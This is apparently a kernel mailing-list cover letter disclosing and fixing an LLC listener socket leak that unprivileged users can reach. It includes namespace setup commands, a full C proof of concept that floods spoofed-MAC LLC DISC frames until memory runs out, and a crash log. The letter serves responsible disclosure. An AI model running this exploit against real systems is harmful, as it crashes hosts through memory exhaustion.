Received: from mail-pj2-f3.google.com (mail-pj2-f3.google.com [74.125.227.131])
	(using TLSv1.2 with cipher ECDHE-RSA-AES128-GCM-SHA256 (128/128 bits))
	(No client certificate requested)
	by smtp.subspace.kernel.org (Postfix) with ESMTPS id 932523314A1
	for <netdev@vger.kernel.org>; Thu, 30 Jul 2026 07:00:53 +0000 (UTC)
Authentication-Results: smtp.subspace.kernel.org; arc=none smtp.client-ip=74.125.227.131
ARC-Seal:i=1; a=rsa-sha256; d=subspace.kernel.org; s=arc-20240116;
	t=1785394858; cv=none; b=V1oQA9RBWlHf9OlIFA3cSUil90Ch0rvAJiM+NDnrZJAuJTzp4apN6LvODSvEB7vsN486Wlvo/BWmWyB6Dje1G6lpTFxXdSE8uIiZOkQcJHXWN+bgP+SUhw5TwdIPjhNfZE+kPcEKXjmDTeeJK4i+yJZq/1MP2ZJNxmAdYyMQqYg=
ARC-Message-Signature:i=1; a=rsa-sha256; d=subspace.kernel.org;
	s=arc-20240116; t=1785394858; c=relaxed/simple;
	bh=xLxOMMi9FiRFA2LedDU3pEAK3X1dQipHPl6FJercoN4=;
	h=From:To:Cc:Subject:Date:Message-ID:MIME-Version; b=U6CW6klirKYmds1AB6CxnX2o4FwAJ6tSNCIV2xciK/0L2EbfSWix14aAQHzC4qAemrZcg4zWyfotrxHepXxvrBZa6EdCo7p8SkeNJJfbAdVBoHgS4xrHPaEwgPnIo+vpajZ5QQ1LBSareS73UVAWm/veezH7D7ehYPjzs7QPt2k=
ARC-Authentication-Results:i=1; smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai; spf=pass smtp.mailfrom=nebusec.ai; dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b=E9p9vQju; arc=none smtp.client-ip=74.125.227.131
Authentication-Results: smtp.subspace.kernel.org; dmarc=pass (p=quarantine dis=none) header.from=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org; spf=pass smtp.mailfrom=nebusec.ai
Authentication-Results: smtp.subspace.kernel.org;
	dkim=pass (2048-bit key) header.d=nebusec.ai header.i=@nebusec.ai header.b="E9p9vQju"
Received: by mail-pj2-f3.google.com with SMTP id d9443c01a7336-2ccbff2e6a7so9347235ad.1
        for <netdev@vger.kernel.org>; Thu, 30 Jul 2026 00:00:53 -0700 (PDT)
DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=nebusec.ai; s=google; t=1785394852; x=1785999652; darn=vger.kernel.org;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:from:to:cc:subject:date:message-id:reply-to:content-type;
        bh=/iiE/aGbBw2q5bGty38SyKRmSLd7GdwBh1EBf3vDe2E=;
        b=E9p9vQjuzlVDfsHkHohVVytJV+2NFlT9zvK29Tnc8hDNB/iKbz9Iz99WeehiThuVh0
         OycucpsXcezxA1QcHz5CtCaWa4eCKrJF92uey5sC/TajDaS3bbZ7OrFTrcCJig0ZHY63
         A6jee5OAVbFkqA8acKlFAnwqBdZqSO8ZzG+/lx6zyrTEmqiM768u9mobEPf2iMoJQc0d
         6YTKY1nhz0n0IOWnoI+MzxIVxrq6j7iiQKahtOoqEbK9Z+FXf1tEwHnr5OD8vlG5rCqU
         xIKoYaxD591HTzk7Z+DRUzD9L2b6q2nfqZuCDr57rBalSAtHBYzjR8r/0Yh3YtexVJ5B
         /QGg==
X-Google-DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
        d=1e100.net; s=20251104; t=1785394852; x=1785999652;
        h=content-transfer-encoding:mime-version:message-id:date:subject:cc
         :to:from:x-gm-gg:x-gm-message-state:from:to:cc:subject:date
         :message-id:reply-to:content-type;
        bh=/iiE/aGbBw2q5bGty38SyKRmSLd7GdwBh1EBf3vDe2E=;
        b=hTOi733X1RFWmTW7H3TQtVKNth4brYTTUbXvcNHnU+QoGUx+w69qGx3f+sVfFi46fr
         DwxttEqbi5HoyA5/rcFPkZqhdoJ6v0NtZZavyGrmEmTSOnJHDzPg2u5X66zIMOMfTaWJ
         P225cgHZ1OsJ7sK1gIjYjE4yxwURsl8cKLNAnsZPj4Vv31RFAWFPgXV1WJe29vr5m3U6
         kOkKnu7PoOMLD3tJGJJx4etmsI1NwNe7aKyk+da88l1XB5AeTmq93ztyuKy+M0N4RsSt
         Lgw4ugHN6r8cekzIbj2Ng9Qk4fAYG6U8H+WDFZ2T5+L+N1ldl48BLSVjUrY9l/rlINKJ
         Z+iA==
X-Gm-Message-State: AOJu0Yyr4H+YidAyCK8PNJqqjTGD8YNTjbO38qKn4UPs/r96hG7rR+y4
	8XWhEEr54YudtUKXEkH3ebtV5ckCwg5YhF6A46pD/YoJLhzeyFVhjK6S/u1bIZzJkizKwPQ7FZJ
	pRMPfEW+PoSM=
X-Gm-Gg: AR+sD10N0tfg+aTRExvrfZ6jGXCOt3+LkPyZ7GIftvzQlVhrGcJa5VdsCWRvEOaMHrT
	CiA1Kgf+inpl4XzwHXCocs/XJa8fxiW1HJH1oP7ZomtvjDnpybKdEBMlGPu7fkRKxO4bZppC8Np
	LbpD+ihl5BuAsPYvKC3c4x7D1DZnwOeuTcZLkH/0VMDcO9qH56FPgymikCzVn5vQC2qccBbvweT
	jiOLokq3wjSDzqxWunJP6NuxvqkHirUXW1+RvPI29hNu9vg/EdCx4oiSfPG7k7e0dp/Sund3tPr
	dOP0XlMK0MXDFMf3tzldrTETFtIV/UY6LJXjM2Cb8Ps4vAXIHNVRuR4+H4cjjf+MaY6+mou3x6M
	kxN1XuZYYObcbpUCLFpFF5j8SM+6Dzb5pBAyE3ANEePfTsMXo4Uundattqwyo4eLAlXgdddhlXr
	q1wLaG3b5/GVTeWD3CI+aXmuYsaq7JLt5ojQzcI/Gxm/6tlRKVsnLkLFGXS5msEAQI0naXV4M=
X-Received: by 2002:a17:902:fda7:b0:2ca:619f:9733 with SMTP id d9443c01a7336-2d035c21bf5mr15470335ad.17.1785394852198;
        Thu, 30 Jul 2026 00:00:52 -0700 (PDT)
Received: from localhost.localdomain ([115.192.250.185])
        by smtp.gmail.com with ESMTPSA id d9443c01a7336-2d022a154ebsm21456755ad.14.2026.07.30.00.00.48
        (version=TLS1_3 cipher=TLS_AES_256_GCM_SHA384 bits=256/256);
        Thu, 30 Jul 2026 00:00:51 -0700 (PDT)
From: Zihan Xi <zihanx@nebusec.ai>
To: netdev@vger.kernel.org
Cc: davem@davemloft.net,
	edumazet@google.com,
	pabeni@redhat.com,
	horms@kernel.org,
	tim.bird@sony.com,
	luoxuanqiang@kylinos.cn,
	vega@nebusec.ai,
	zihanx@nebusec.ai
Subject: [PATCH net v2 0/1] llc: fix listener child socket leaks
Date: Thu, 30 Jul 2026 07:00:21 +0000
Message-ID: <cover.1785386749.git.zihanx@nebusec.ai>
X-Mailer: git-send-email 2.47.3
Precedence: bulk
X-Mailing-List: netdev@vger.kernel.org
List-Id: <netdev.vger.kernel.org>
List-Subscribe: <mailto:netdev+subscribe@vger.kernel.org>
List-Unsubscribe: <mailto:netdev+unsubscribe@vger.kernel.org>
MIME-Version: 1.0
Content-Transfer-Encoding: 8bit

Hi Linux kernel maintainers,

We found and validated a issue in net/llc/llc_conn.c. The bug is reachable by a
non-root user via user and net namespace.
We've tested it, and it should not affect any other functionality.

We will provide detailed information about the bug
in this email, along with a PoC to trigger it.

---- details below ----

Bug details:

llc_conn_handler() creates a child socket before the passive-open path
finishes publishing it to accept(). Two listener-side paths can leave
that child behind.

First, non-SABME frames could still allocate an incoming child even
though only SABME is a valid passive-open request. Those frames never
publish the child to accept() and leak the child socket and its device
reference. Repeating such frames with unique source addresses leaks LLC
child sockets until memory is exhausted.

Second, even for a valid SABME request, the child is created before the
connection state machine reaches LLC_CONN_PRIM. If SABME setup fails
first, or if a listener-owned SABME skb is dropped before the
current tree can process it, that unpublished child can remain linked
in the SAP tables with its held device reference while it is still
invisible to accept().

The root cause is older than the later accept-path cleanup. That later
change did not introduce the listener-side allocation-before-admission
fact; it only preserved the same underlying behavior in a refactored
accept path. Therefore the Fixes tag points at the earliest visible git
history where this root-cause fact is already present.

This v2 only creates a child socket for SABME commands. DISC commands
and command frames with P=1 get the disconnected-mode DM response
without allocating a child socket or running the listener through the
connection state machine. Other non-SABME listener frames are dropped.
For listener-owned SABME traffic, no child is created before
backlog enqueue, so backlog-side drops in the current tree cannot
strand an unpublished child. If direct SABME processing fails before
the new child becomes visible to accept(), the listener tears that
unpublished child back out of the SAP and releases its held device
reference.

The reproducer writes panic_on_oom only to turn the final memory
exhaustion into stable crash evidence. It is not a prerequisite for the
underlying leak or for the unprivileged trigger path itself.

packetdrill was not used here because the trigger depends on combining a
PF_LLC listening socket with raw AF_PACKET injection over a veth pair
while rotating the source MAC address to force distinct child socket
creation. The PoC is centered on that listener plus raw-packet resource
leak path rather than on a packetdrill-friendly protocol timing script.

Reproducer:

    gcc -O2 -static -o poc poc.c
    unshare -Urn sh -c '
        ip link add llc_rx0 type veth peer name llc_tx0
        ip link set llc_rx0 address 02:11:22:33:44:55
        ip link set llc_tx0 address 02:11:22:33:44:66
        ip link set llc_rx0 up
        ip link set llc_tx0 up
        ./poc llc_rx0 llc_tx0 110000
    '

For deterministic crash evidence only, after confirming the leak with
that unprivileged trigger path, we additionally set:

    echo 2 > /proc/sys/vm/panic_on_oom

We run the PoC in a 2 vCPU, 2 GB RAM x86 QEMU environment.

------BEGIN poc.c------
#define _GNU_SOURCE

#include <arpa/inet.h>
#include <errno.h>
#include <linux/if_arp.h>
#include <linux/if_ether.h>
#include <linux/if_packet.h>
#include <linux/if.h>
#include <linux/llc.h>
#include <net/ethernet.h>
#include <stdbool.h>
#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/ioctl.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <unistd.h>

#ifndef AF_LLC
#define AF_LLC 26
#endif

#define DEFAULT_RX_IF "llc_rx0"
#define DEFAULT_TX_IF "llc_tx0"
#define DEFAULT_SAP 0xc0
#define DEFAULT_REPORT_EVERY 10000ULL

static void die_errno(const char *what)
{
	perror(what);
	exit(EXIT_FAILURE);
}

static void usage(const char *prog)
{
	fprintf(stderr,
		"usage: %s [rx_if] [tx_if] [count]\n"
		"  rx_if: LLC listener interface (default: %s)\n"
		"  tx_if: raw packet sender interface (default: %s)\n"
		"  count: number of DISC frames to send, 0 means forever\n",
		prog, DEFAULT_RX_IF, DEFAULT_TX_IF);
}

static void get_if_hwaddr(const char *ifname, unsigned char mac[ETH_ALEN])
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFHWADDR, &ifr) < 0)
		die_errno("ioctl(SIOCGIFHWADDR)");

	memcpy(mac, ifr.ifr_hwaddr.sa_data, ETH_ALEN);
	close(fd);
}

static int get_ifindex(const char *ifname)
{
	struct ifreq ifr;
	int fd;

	fd = socket(AF_INET, SOCK_DGRAM, 0);
	if (fd < 0)
		die_errno("socket(AF_INET)");

	memset(&ifr, 0, sizeof(ifr));
	snprintf(ifr.ifr_name, sizeof(ifr.ifr_name), "%s", ifname);
	if (ioctl(fd, SIOCGIFINDEX, &ifr) < 0)
		die_errno("ioctl(SIOCGIFINDEX)");

	close(fd);
	return ifr.ifr_ifindex;
}

static int make_listener(const char *ifname, uint8_t sap, unsigned char mac[ETH_ALEN])
{
	struct sockaddr_llc addr;
	int fd;

	fd = socket(AF_LLC, SOCK_STREAM, 0);
	if (fd < 0)
		die_errno("socket(AF_LLC)");

	get_if_hwaddr(ifname, mac);

	memset(&addr, 0, sizeof(addr));
	addr.sllc_family = AF_LLC;
	addr.sllc_arphrd = ARPHRD_ETHER;
	addr.sllc_sap = sap;
	memcpy(addr.sllc_mac, mac, ETH_ALEN);

	if (bind(fd, (struct sockaddr *)&addr, sizeof(addr)) < 0)
		die_errno("bind(AF_LLC)");
	if (listen(fd, 16) < 0)
		die_errno("listen(AF_LLC)");

	return fd;
}

static int make_packet_socket(const char *ifname, int *ifindex_out)
{
	struct sockaddr_ll sll;
	int fd;
	int one = 1;
	int ifindex = get_ifindex(ifname);

	fd = socket(AF_PACKET, SOCK_RAW, htons(ETH_P_ALL));
	if (fd < 0)
		die_errno("socket(AF_PACKET)");

	setsockopt(fd, SOL_PACKET, PACKET_QDISC_BYPASS, &one, sizeof(one));

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_protocol = htons(ETH_P_ALL);
	sll.sll_ifindex = ifindex;

	if (bind(fd, (struct sockaddr *)&sll, sizeof(sll)) < 0)
		die_errno("bind(AF_PACKET)");

	*ifindex_out = ifindex;
	return fd;
}

static void fill_src_mac(unsigned char mac[ETH_ALEN], uint64_t n)
{
	mac[0] = 0x02;
	mac[1] = (n >> 32) & 0xff;
	mac[2] = (n >> 24) & 0xff;
	mac[3] = (n >> 16) & 0xff;
	mac[4] = (n >> 8) & 0xff;
	mac[5] = n & 0xff;
}

int main(int argc, char **argv)
{
	static unsigned char frame[ETH_ZLEN];
	unsigned char dst_mac[ETH_ALEN];
	unsigned char src_mac[ETH_ALEN];
	struct sockaddr_ll sll;
	const char *rx_if = DEFAULT_RX_IF;
	const char *tx_if = DEFAULT_TX_IF;
	uint64_t count = 0;
	uint64_t i = 1;
	int listener_fd;
	int packet_fd;
	int ifindex;

	if (argc > 1 && (!strcmp(argv[1], "-h") || !strcmp(argv[1], "--help"))) {
		usage(argv[0]);
		return 0;
	}
	if (argc > 1)
		rx_if = argv[1];
	if (argc > 2)
		tx_if = argv[2];
	if (argc > 3) {
		char *end = NULL;

		errno = 0;
		count = strtoull(argv[3], &end, 0);
		if (errno || !end || *end != '\0') {
			fprintf(stderr, "invalid count: %s\n", argv[3]);
			return EXIT_FAILURE;
		}
	}
	if (argc > 4) {
		usage(argv[0]);
		return EXIT_FAILURE;
	}

	listener_fd = make_listener(rx_if, DEFAULT_SAP, dst_mac);
	packet_fd = make_packet_socket(tx_if, &ifindex);

	memset(frame, 0, sizeof(frame));
	memcpy(frame, dst_mac, ETH_ALEN);
	((struct ethhdr *)frame)->h_proto = htons(3);
	frame[ETH_HLEN + 0] = DEFAULT_SAP;
	frame[ETH_HLEN + 1] = 0x04;
	frame[ETH_HLEN + 2] = 0x43; /* DISC command, P/F=0 */

	memset(&sll, 0, sizeof(sll));
	sll.sll_family = AF_PACKET;
	sll.sll_ifindex = ifindex;
	sll.sll_halen = ETH_ALEN;
	memcpy(sll.sll_addr, dst_mac, ETH_ALEN);

	fprintf(stderr,
		"listener_if=%s sender_if=%s sap=0x%02x count=%s\n",
		rx_if, tx_if, DEFAULT_SAP, count ? argv[3] : "0");
	fprintf(stderr,
		"listener_mac=%02x:%02x:%02x:%02x:%02x:%02x\n",
		dst_mac[0], dst_mac[1], dst_mac[2],
		dst_mac[3], dst_mac[4], dst_mac[5]);
	fprintf(stderr,
		"sending LLC DISC commands with a unique spoofed source MAC each time\n");

	while (!count || i <= count) {
		fill_src_mac(src_mac, i);
		if (!memcmp(src_mac, dst_mac, ETH_ALEN))
			src_mac[ETH_ALEN - 1] ^= 1;
		memcpy(frame + ETH_ALEN, src_mac, ETH_ALEN);

		if (sendto(packet_fd, frame, sizeof(frame), 0,
			   (struct sockaddr *)&sll, sizeof(sll)) < 0)
			die_errno("sendto(AF_PACKET)");

		if (!(i % DEFAULT_REPORT_EVERY))
			fprintf(stderr, "sent=%llu\n",
				(unsigned long long)i);
		i++;
	}

	close(packet_fd);
	close(listener_fd);
	return 0;
}
------END poc.c--------

----BEGIN crash log----
[ 1665.704541][T10284] Kernel panic - not syncing: Out of memory: compulsory panic_on_oom is enabled

[ 1665.705358][T10284] CPU: 0 UID: 0 PID: 10284 Comm: poc Not tainted 6.12.74 #3

[ 1665.705911][T10284] Hardware name: QEMU Ubuntu 24.04 PC (i440FX + PIIX, 1996), BIOS 1.16.3-debian-1.16.3-2 04/01/2014

[ 1665.706676][T10284] Call Trace:

[ 1665.706943][T10284]  <TASK>

[1665.707181][T10284] dump_stack_lvl (lib/dump_stack.c:105 (discriminator 2))

[1665.707568][T10284] panic (kernel/panic.c:339 (discriminator 1))

[1665.707918][T10284] ? dump_header (include/linux/rcupdate.h:815 (discriminator 1) mm/oom_kill.c:455 (discriminator 1) mm/oom_kill.c:478 (discriminator 1))

[1665.708305][T10284] ? __pfx_panic (kernel/panic.c:277)
-----END crash log-----
changes in v2:
  - Send stateless DM replies for DISC and command frames with P=1
    instead of running non-SABME frames on the listener socket.
  - Drop other non-SABME listener frames without creating a child socket
    or entering the listener connection state machine.
  - Avoid creating a listener-owned SABME child before backlog enqueue,
    so backlog-side drops in the current tree cannot strand an
    unpublished child.
  - Roll back unpublished child sockets when direct SABME processing
    fails before LLC_CONN_PRIM makes them visible to accept().
  - Clarify that panic_on_oom is only used to make crash evidence
    deterministic, not to express an extra trigger privilege.
  - Explain why this PoC is kept as a raw AF_PACKET reproducer rather
    than rewritten as packetdrill.
  - Add the required Assisted-by trailer in the numbered patch.
  - v1 Link: https://lore.kernel.org/all/cover.1784725007.git.zihanx@nebusec.ai/

Best regards,
Zihan Xi

Zihan Xi (1):
  llc: fix listener child socket leaks

 net/llc/llc_conn.c | 90 +++++++++++++++++++++++++++++++++++++++++-----
 1 file changed, 81 insertions(+), 9 deletions(-)

-- 
2.43.0
